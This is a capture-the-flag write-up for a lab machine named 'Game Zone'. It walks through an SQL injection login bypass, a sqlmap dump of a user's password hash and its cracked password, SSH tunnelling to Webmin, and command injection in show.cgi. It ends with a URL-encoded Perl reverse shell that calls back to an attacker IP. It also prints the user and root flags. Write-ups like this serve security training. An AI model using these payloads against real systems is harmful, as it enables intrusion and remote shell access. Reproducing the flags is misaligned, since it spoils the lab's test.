> Game Zone

We are prompted with a forum and we have login here. Looks like we can try to SQLi . Trying username `admin`:`' OR 1=1 -- -` but didn't work. So mayne the user `admin` is not present. Let's try the username as `' OR 1=1 -- -` and any password gives us access to `portal.php`. Let's intercept the request to `portal.php` and save it as `request.txt`.

# sqlmap

sqlmap -r request.txt --dbms=mysql --dump --batch

```
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+
```

And we got another table `post` with the game names and description there. I cracked the password in online `videogamer124`.

# user.txt

```
649ac17b1480ac13ef1e4fa579dac95c
```

Let's look at socker connections.

ss -tulpn

```
Netid  State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
udp    UNCONN     0      0       *:10000               *:*                  
udp    UNCONN     0      0       *:68                  *:*                  
tcp    LISTEN     0      128     *:10000               *:*                  
tcp    LISTEN     0      128     *:22                  *:*                  
tcp    LISTEN     0      80     127.0.0.1:3306                *:*                  
tcp    LISTEN     0      128    :::80                 :::*                  
tcp    LISTEN     0      128    :::22                 :::*    
```

Looks like port 10000 is blocked via firewall. Let's try accessing this through ssh.

`ssh -L 10000:localhost:10000 agent47@10.10.6.41`. Accessing `http://localhost:10000/` we are prompted with webmin. And we can use the same creds for webin and login.

We got a metasploit module and looking at the code we can understand that we can supply any filename followed by a pipe and then we can inject our payload. 

# POC

1. (local) sudo tcpdump -i tun0 icmp
2. http://localhost:10000/file/show.cgi/show.cgi/bin/A|ping%20-c%203%2010.8.107.21|

Now let's try to get a shell!!

# Perl payload

`http://localhost:10000/file/show.cgi/bin/4uIPiqNld|perl%20-e%20'use%20Socket;$i=%2210.8.107.21%22;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22));if(connect(S,sockaddr_in($p,inet_aton($i))))%7Bopen(STDIN,%22%3E&S%22);open(STDOUT,%22%3E&S%22);open(STDERR,%22%3E&S%22);exec(%22/bin/sh%20-i%22);%7D;'|`

# root.txt

```
a4b945830144bdd71908d12d902adeee
```